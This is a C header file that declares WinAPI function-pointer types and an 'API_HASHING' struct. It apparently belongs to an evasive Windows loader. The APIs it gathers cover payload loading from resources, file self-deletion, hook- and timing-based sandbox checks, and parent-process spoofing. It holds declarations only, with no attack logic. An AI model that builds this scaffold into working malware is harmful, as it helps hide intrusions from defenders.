#include <Windows.h>

// FindResourceW	
typedef HRSRC(WINAPI* fnFindResourceW)(HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType);
// LoadResource
typedef HGLOBAL(WINAPI* fnLoadResource)(HMODULE hModule, HRSRC hResInfo);
// LockResource
typedef LPVOID(WINAPI* fnLockResource)(HGLOBAL hResData);
// SizeofResource
typedef DWORD(WINAPI* fnSizeofResource)(HMODULE hModule, HRSRC hResInfo);

// OpenProcess
typedef HANDLE(WINAPI* fnOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);

// GetModuleFileNameW
typedef DWORD(WINAPI* fnGetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// CreateFileW
typedef HANDLE(WINAPI* fnCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// SetFileInformationByHandle
typedef BOOL(WINAPI* fnSetFileInformationByHandle)(HANDLE hFile, FILE_INFO_BY_HANDLE_CLASS FileInformationClass, LPVOID lpFileInformation, DWORD dwBufferSize);

// CallNextHookEx
typedef LRESULT(WINAPI* fnCallNextHookEx)(HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam);
// SetWindowsHookExW
typedef HHOOK(WINAPI* fnSetWindowsHookExW)(int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId);
// GetMessageW
typedef BOOL(WINAPI* fnGetMessageW)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
// DefWindowProcW
typedef LRESULT(WINAPI* fnDefWindowProcW)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// UnhookWindowsHookEx
typedef BOOL(WINAPI* fnUnhookWindowsHookEx)(HHOOK hhk);

// GetTickCount64
typedef ULONGLONG(WINAPI* fnGetTickCount64)();

// GetEnvironmentVariableAHashValue
typedef DWORD(WINAPI* fnGetEnvironmentVariableA)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);

// InitializeProcThreadAttributeList
typedef BOOL(WINAPI* fnInitializeProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwAttributeCount, DWORD dwFlags, PSIZE_T lpSize);

// UpdateProcThreadAttribute
typedef BOOL(WINAPI* fnUpdateProcThreadAttribute)(LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwFlags, DWORD_PTR Attribute, PVOID lpValue, SIZE_T cbSize, PVOID lpPreviousValue, PSIZE_T lpReturnSize);

// CreateProcessA
typedef BOOL(WINAPI* fnCreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

// DeleteProcThreadAttributeList
typedef VOID(WINAPI* fnDeleteProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList);

typedef struct _API_HASHING {

	fnFindResourceW						pFindResourceW;
	fnLoadResource						pLoadResource;
	fnLockResource						pLockResource;
	fnSizeofResource					pSizeofResource;

	fnOpenProcess						pOpenProcess;

	fnGetModuleFileNameW				pGetModuleFileNameW;
	fnCreateFileW						pCreateFileW;
	fnSetFileInformationByHandle		pSetFileInformationByHandle;

	fnCallNextHookEx					pCallNextHookEx;
	fnSetWindowsHookExW					pSetWindowsHookExW;
	fnGetMessageW						pGetMessageW;
	fnDefWindowProcW					pDefWindowProcW;
	fnUnhookWindowsHookEx				pUnhookWindowsHookEx;

	fnGetTickCount64					pGetTickCount64;

	fnGetEnvironmentVariableA			pGetEnvironmentVariableA;
	fnInitializeProcThreadAttributeList pInitializeProcThreadAttributeList;
	fnUpdateProcThreadAttribute			pUpdateProcThreadAttribute;
	fnCreateProcessA					pCreateProcessA;
	fnDeleteProcThreadAttributeList		pDeleteProcThreadAttributeList;

}API_HASHING, * PAPI_HASHING;

extern API_HASHING g_Api;